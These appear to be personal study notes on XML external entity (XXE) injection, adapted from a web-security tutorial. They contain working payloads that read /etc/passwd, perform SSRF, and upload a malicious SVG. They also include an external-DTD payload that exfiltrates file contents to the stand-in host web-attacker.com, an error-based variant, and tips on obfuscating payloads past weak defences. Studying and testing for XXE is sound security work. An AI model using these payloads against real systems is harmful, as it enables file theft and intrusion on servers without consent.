 XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks. 




here are various types of XXE attacks:
=
Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a    file, and returned in the application's response.

    Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
    
    Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
    
    Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.



Exploiting XXE to retrieve files
=
To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

    Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
    
    Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.



 For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

==The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>


#note!!!! never forget this
<stockCheck><productId>&xxe;</productId></stockCheck>

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin


Exploiting XXE to perform SSRF attacks
==
Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access. 



 In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>



==
 Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML.
XInclude attacks

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For ==example:->>>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>




XXE attacks via file upload
==
Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities. 


payload used :


<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>


put payload in and svg file and uplaod it then navigate to the file 






Finding and exploiting blind XXE vulnerabilities
==


Detecting blind XXE using out-of-band (OAST) techniques

You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful. 





How to find and test for XXE vulnerabilities
==
The vast majority of XXE vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

Manually testing for XXE vulnerabilities generally involves:

    Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
    
    Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator is perfect for this purpose.
    
    Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.

Note ##

Keep in mind that XML is just a data transfer format. Make sure you also test any XML-based functionality for other vulnerabilities like XSS and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to obfuscate your attack in order to bypass weak defences.
How to prevent XXE vulnerabilities

Virtually all XXE vulnerabilities arise because the application's XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The easiest and most effective way to prevent XXE attacks is to disable those features. 



XXE Parameter Entity
==
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name: 


 This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

#payload 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>




This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful. 


exploiting XxE Out band  for data
==
Blind **XML External Entity (XXE)** vulnerabilities may not return data directly in the HTTP response.  
To **exfiltrate sensitive data**, attackers can host a **malicious external DTD** on a server they control and make the vulnerable XML parser load it.

The malicious DTD performs the **data extraction and transmission**.

# Attack Workflow

1. **Host a malicious DTD** on an attacker-controlled server.
    
2. **Trigger the application to load the external DTD** using an XXE payload.
    
3. The malicious DTD:
    
    - Reads sensitive files from the target system.
        
    - Sends the data to the attacker's server via an HTTP request.




# Malicious DTD Example
#payload
<!ENTITY % file SYSTEM "file:///etc/passwd">  
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">  
%eval;  
%exfiltrate;
### What Happens

1. **file entity**
    
    - Reads the local file `/etc/passwd`.
        
2. **eval entity**
    
    - Dynamically creates another entity called `exfiltrate`.
        
3. **exfiltrate entity**
    
    - Sends the file content to the attacker via HTTP request.
        

---

#payload 

<!DOCTYPE foo [  
<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd">  
%xxe;  
]>




#limitations
Some XML parsers **reject newline characters** in URLs.

Because `/etc/passwd` contains newlines, exfiltration may fail.

### Workarounds

- Use **FTP instead of HTTP**
    
- Target files without newline characters
    

Example:

/etc/hostname




Exploiting blind XXE to retrieve data via error messages
=
An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the /etc/passwd file using a malicious external DTD as follows:
#payload
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

